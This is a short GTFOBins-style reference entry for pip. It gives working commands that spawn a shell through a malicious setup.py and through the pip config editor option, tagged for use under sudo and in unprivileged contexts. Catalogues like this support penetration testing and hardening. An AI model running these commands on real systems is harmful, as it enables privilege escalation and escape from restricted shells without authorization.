---
type: gtfobin
name: pip
platform: Unix
functions: [inherit, shell]
tags: [gtfobin, unix, lotl]
---

# pip

## inherit

```bash
echo '...' >setup.py
pip install --break-system-packages .
```
_This allows to run Python code (`...`). It executes a Python script named `setup.py` in the directory passed as argument (`.`).

Keep in mind that the TTY is lost, so `/dev/tty` can be used, for example:

```
echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' >setup.py
```

The `--break-system-packages` flag can be omitted in older systems._
**Contexts:** sudo, unprivileged

## shell

```bash
pip config --editor '/bin/sh -s' edit
```
**Contexts:** sudo, unprivileged
